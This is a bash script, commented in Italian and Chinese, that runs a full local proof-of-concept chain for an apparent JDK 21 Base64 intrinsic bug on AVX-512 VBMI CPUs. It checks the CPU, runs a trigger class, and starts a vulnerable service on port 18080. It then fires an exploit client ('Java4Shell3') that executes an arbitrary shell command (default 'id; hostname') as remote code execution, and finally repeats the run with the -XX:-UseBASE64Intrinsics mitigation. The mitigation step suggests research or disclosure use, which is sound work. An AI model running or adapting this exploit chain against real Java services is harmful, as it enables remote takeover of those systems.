#!/usr/bin/env bash
# run_local.sh - catena completa SU QUESTA MACCHINA (deve essere x86-64 con avx512vbmi):
#  [1] verifica CPU  [2] PoC trigger  [3] service vulnerabile + exploit (RCE)
#  [4] riesegui con mitigazione -XX:-UseBASE64Intrinsics (attesa: 0 corruzioni + LOCKED)
# 用法: JAVA=/path/to/prepatch/jdk21 ./scripts/run_local.sh [cmd]
set -e
cd "$(dirname "$0")/.."
JAVA_HOME_BIN=${JAVA:-java}; JBIN=$(dirname "$JAVA_HOME_BIN")
CMD="${1:-id; hostname}"
[ -d out ] || ./scripts/build.sh
echo "== [1] CPU gate =="
if [ "$(grep -c avx512vbmi /proc/cpuinfo 2>/dev/null || echo 0)" -eq 0 ]; then
  echo "FATAL: flag avx512vbmi assento (richiesto x86-64 Ice Lake/Zen4+; M1/Rosetta NO)"; exit 3
fi
grep -m1 "model name" /proc/cpuinfo
echo "== [2] PoC trigger (atteso: REPRODUCED changed=62) =="
"$JBIN/../bin/java" -cp out Base64Trigger || java -cp out Base64Trigger
echo "== [3] exploit vs service vulnerabile =="
pkill -f "Base64Service3 18080" || true; sleep 1
nohup java -cp out Base64Service3 18080 >/tmp/svc.log 2>&1 & sleep 5
java -cp out Java4Shell3 127.0.0.1 18080 "$CMD"
echo "== [4] mitigated (-XX:-UseBASE64Intrinsics) =="
pkill -f "Base64Service3 18080" || true; sleep 1
nohup java -XX:-UseBASE64Intrinsics -cp out Base64Service3 18080 >/tmp/svc_m.log 2>&1 & sleep 5
java -cp out Java4Shell3 127.0.0.1 18080 "$CMD" --patched
pkill -f "Base64Service3 18080" || true
echo "== CHAIN DONE =="
